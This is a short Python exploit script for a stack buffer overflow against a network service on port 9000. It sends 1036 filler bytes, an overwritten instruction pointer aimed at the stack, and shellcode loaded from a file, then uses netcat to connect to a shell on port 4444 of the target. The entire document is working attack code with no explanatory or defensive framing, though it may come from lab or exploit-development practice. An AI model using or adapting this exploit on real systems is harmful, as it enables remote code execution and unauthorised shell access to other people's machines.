#!/usr/bin/python

import socket
import sys
import os

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

redEIP = b'\x30\xf7\x22\x00' #redirect EIP to top of stack

file = open('shellcode.bin','rb')
shellcode=file.read()
file.close()

buffer = b'A'*1036+redEIP+shellcode+b'D'*(2000-1036-8-328) #328 is sizeof shellcode

if __name__ == '__main__':
	sock.connect((sys.argv[1],9000))
	sock.send(buffer)
	sock.close()
	cmd4shell = 'nc -nv ' + sys.argv[1] + ' 4444'
	os.system(cmd4shell)
